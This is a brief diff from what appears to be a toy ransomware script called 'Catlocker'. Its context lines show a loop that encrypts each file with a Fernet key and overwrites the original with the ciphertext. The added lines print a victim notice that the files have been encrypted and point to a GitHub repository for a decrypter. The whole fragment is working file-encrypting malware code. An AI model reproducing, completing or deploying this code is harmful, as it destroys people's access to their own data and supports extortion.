@@ -26,3 +26,5 @@ for file in files:
         encrypt = Fernet(key).encrypt(fileconts)
         with open(file, "wb") as thefile:
                 thefile.write(encrypt)
+                
+print("Your files have been encrypted, you might find a decrypter here: https://github.com/catsruleu/Catlocker_Decrypter")
